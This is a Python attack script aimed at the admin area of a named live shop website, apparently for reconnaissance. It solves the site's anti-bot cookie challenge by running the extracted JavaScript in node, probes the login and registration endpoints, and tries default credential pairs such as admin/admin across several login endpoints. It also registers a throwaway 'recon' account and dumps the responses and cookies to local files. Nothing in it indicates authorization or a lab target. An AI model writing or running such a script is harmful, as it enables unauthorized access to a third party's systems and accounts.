#!/usr/bin/env python3
"""Auth/register + pay flow on xunqq Rainbow shop."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
OUT = Path("/data/recon/pfqq.net")


def set_cookie(cj, n, v):
    cj.set_cookie(
        http.cookiejar.Cookie(
            0, n, v, None, False, "xunqq.cn", False, False, "/", False,
            False, None, False, None, None, {},
        )
    )


def make_session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None, headers=None):
        h = {"User-Agent": UA, "Referer": BASE + "/", "Accept": "*/*"}
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h)
        try:
            resp = op.open(req, timeout=20)
            return resp.read().decode("utf-8", "ignore"), resp.geturl(), getattr(resp, "status", 200)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "ignore")
            return f"HTTP_{e.code}:{body[:500]}", url, e.code

    # warm + waf
    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html, _, _ = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    if m:
        val = subprocess.run(
            ["node", "-e", f"console.log({m.group(1)})"],
            capture_output=True,
            text=True,
            timeout=15,
        ).stdout.strip()
        set_cookie(cj, "sec_defend", val)
        set_cookie(cj, "sec_defend_time", "2")
        html, _, _ = get(BASE + "/index.php")
    return get, cj, html


def main():
    get, cj, html = make_session()
    out = {}

    # inspect login page
    login_html, _, _ = get(BASE + "/user/login.php")
    (OUT / "probe" / "user_login.php.html").write_text(login_html, encoding="utf-8")
    print("LOGIN PAGE len", len(login_html))
    forms = re.findall(r"<form[\s\S]*?</form>", login_html, re.I)
    print("forms", len(forms))
    for f in forms[:2]:
        print("FORM fields", re.findall(r'name=["\']([^"\']+)["\']', f))
        print("FORM action", re.search(r'action=["\']([^"\']*)["\']', f))
        print(f[:500])

    # scripts mentioning act=
    acts = sorted(set(re.findall(r"act[=:][\"']?([\w]+)", login_html)))
    print("acts", acts)
    ajax_calls = re.findall(r"ajax\.php[^\"'\s]*", login_html)
    print("ajax", ajax_calls[:20])

    # try register page
    for path in [
        "/user/reg.php",
        "/user/register.php",
        "/user/ajax.php?act=reg",
        "/ajax.php?act=reg",
        "/ajax.php?act=login",
        "/user/ajax.php?act=login",
    ]:
        body, final, code = get(BASE + path)
        print("PATH", path, code, len(body), body[:160].replace("\n", " "))

    # login attempts via ajax
    creds = [
        ("admin88", "admin88"),
        ("admin", "admin"),
        ("admin", "admin888"),
        ("test", "test123"),
        ("13800138000", "123456"),
    ]
    login_results = []
    for user, pwd in creds:
        for endpoint, payload in [
            (
                BASE + "/ajax.php?act=login",
                {"user": user, "pass": pwd},
            ),
            (
                BASE + "/ajax.php?act=login",
                {"username": user, "password": pwd},
            ),
            (
                BASE + "/user/ajax.php?act=login",
                {"user": user, "pass": pwd},
            ),
            (
                BASE + "/user/login.php",
                {"user": user, "pass": pwd},
            ),
        ]:
            body, final, code = get(
                endpoint,
                data=urllib.parse.urlencode(payload).encode(),
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            interesting = any(
                k in body for k in ["code\":0", "成功", "登录成功", "token", "userid"]
            ) or ("错误" not in body and "失败" not in body and "HTTP_" not in body and len(body) < 300)
            print("LOGINTRY", user, endpoint.split(BASE)[-1], body[:200])
            login_results.append({
                "user": user,
                "endpoint": endpoint,
                "body": body[:300],
                "interesting": interesting,
            })

    # register via ajax
    reg_user = "recon" + str(subprocess.run(["date", "+%s"], capture_output=True, text=True).stdout.strip()[-6:])
    reg_pass = "Recon123456"
    for endpoint, payload in [
        (
            BASE + "/ajax.php?act=reg",
            {"user": reg_user, "pass": reg_pass, "qq": "123456", "email": f"{reg_user}@test.com"},
        ),
        (
            BASE + "/user/ajax.php?act=reg",
            {"user": reg_user, "pass": reg_pass, "qq": "123456"},
        ),
        (
            BASE + "/ajax.php?act=register",
            {"user": reg_user, "pass": reg_pass},
        ),
    ]:
        body, _, _ = get(
            endpoint,
            data=urllib.parse.urlencode(payload).encode(),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        print("REG", endpoint.split(BASE)[-1], reg_user, body[:250])

    # if we can login with admin88 after register fail, try pay
    # re-login admin88 via most promising endpoint from login page JS
    # scrape login JS from page more carefully
    scripts = re.findall(r"<script[^>]*>([\s\S]*?)</script>", login_html)
    for i, s in enumerate(scripts):
        if "ajax" in s or "login" in s or "pass" in s:
            print(f"===LOGIN SCRIPT {i}===")
            print(s[:1500])

    out["login_results"] = login_results
    out["reg_user"] = reg_user
    (OUT / "dump" / "AUTH.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("cookies", [(c.name, (c.value or "")[:40]) for c in cj])
    print("DONE")


if __name__ == "__main__":
    main()
